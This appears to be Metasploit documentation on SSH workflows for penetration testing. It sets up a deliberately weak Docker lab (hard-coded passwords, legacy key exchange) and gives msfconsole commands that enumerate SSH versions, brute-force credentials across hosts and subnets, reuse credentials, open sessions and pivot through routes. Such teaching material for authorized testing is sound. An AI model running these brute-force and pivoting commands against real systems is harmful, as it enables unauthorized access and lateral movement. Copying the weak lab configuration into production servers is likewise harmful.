## SSH Workflows

SSH, also known as Secure Shell or Secure Socket Shell, is frequently found on port 22/TCP. The protocol allows for SSH clients to securely connect to a running SSH server to execute commands against, the protocol also supports tunneling network traffic - which Metasploit can leverage for pivoting purposes.

Metasploit has support for multiple SSH modules, including:

- Version enumeration
- Verifying/bruteforcing credentials
- Opening sessions
- Pivoting support

There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:

```msf
msf6 > search ssh
```

### Lab Environment

There are multiple SSH servers to choose from and install on a host machine, including:
- OpenSSH - OpenBSD Secure Shell, most popular
- Dropbear

It is also possible to use [Docker](https://www.docker.com/). First create a new `Dockerfile`:

```docker
FROM alpine:latest

RUN apk add --update
RUN apk --no-cache add openssh
RUN ssh-keygen -A
RUN echo 'root:toor' | chpasswd

RUN echo $' AuthorizedKeysFile .ssh/authorized_keys\n\
GatewayPorts no \n\
X11Forwarding no \n\
Subsystem       sftp    /usr/lib/ssh/sftp-server \n\
PasswordAuthentication yes \n\
AllowTcpForwarding yes \n\
PasswordAuthentication yes \n\
AllowTcpForwarding yes' > /etc/ssh/sshd_config

RUN echo "KexAlgorithms diffie-hellman-group1-sha1"  >> /etc/ssh/sshd_config

RUN addgroup -g 700 test_user \
    && adduser -G test_user -D -u 700 -S -h /home/test_user -s /bin/sh test_user
RUN echo -n 'test_user:password123' | chpasswd

EXPOSE 22

CMD ["/usr/sbin/sshd","-D"]
```

Build and run:

```
docker build --tag ssh_lab:latest - < Dockerfile
docker run --rm -it --publish 127.0.0.1:2222:22 ssh_lab:latest
```

It should now be possible to test the SSH login from msfconsole:

```msf
msf6 > use scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://test_user:password123@127.0.0.1:2222

[*] 127.0.0.1:2222 - Starting bruteforce
[+] 127.0.0.1:2222 - Success: 'test_user:password123' 'uid=700(test_user) gid=700(test_user) groups=700(test_user),700(test_user) Linux 5a26fe63abef 5.10.25-linuxkit #1 SMP Tue Mar 23 09:27:39 UTC 2021 x86_64 Linux '
[*] SSH session 1 opened (127.0.0.1:57318 -> 127.0.0.1:2222 ) at 2022-04-23 01:25:01 +0100
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Note that TCP forwarding requires the `AllowTcpForwarding` option to be enabled in the server's configuration file, which is often the default. If the option is disabled or the more specific `PermitOpen` option does not allow the connection to be made, the connection will fail with the `administratively prohibited` error.

### SSH Enumeration

Enumerate SSH version:

```
use auxiliary/scanner/ssh/ssh_version
run ssh://127.0.0.1
```

### SSH Bruteforce

Brute-force host with known user and password list:

```
use scanner/ssh/ssh_login
run ssh://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials:

```
use scanner/ssh/ssh_login
run ssh://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
run cidr:/24:ssh://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
```

### SSH Login Session

If you have valid SSH credentials the `ssh_login` module will open a Metasploit session for you:

```
use scanner/ssh/ssh_login
run ssh://user:pass@172.18.102.20
```

Re-using SSH credentials in a subnet:

```
use scanner/ssh/ssh_login
run cidr:/24:ssh://user:pass@192.168.222.0 threads=50
```

Using an alternative port:

```
use scanner/ssh/ssh_login
run ssh://user:pass@192.168.123.6:2222
```

### SSH Pivoting

It is only possible to perform SSH Pivoting if the remote target has the `AllowTcpForwarding` option be enabled in the server's configuration file, which is often the default. If the option is disabled or the more specific `PermitOpen` option does not allow the connection to be made, the connection will fail with the `administratively prohibited` error.

Like Meterpreter, it is possible to [port forward through a Metasploit SSH session](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login.md#session-capabilities):

```
route add 172.18.103.0/24 ssh_session_id
```

To a route for the most recently opened Meterpreter session:

```
route add 172.18.103.0/24 -1
```
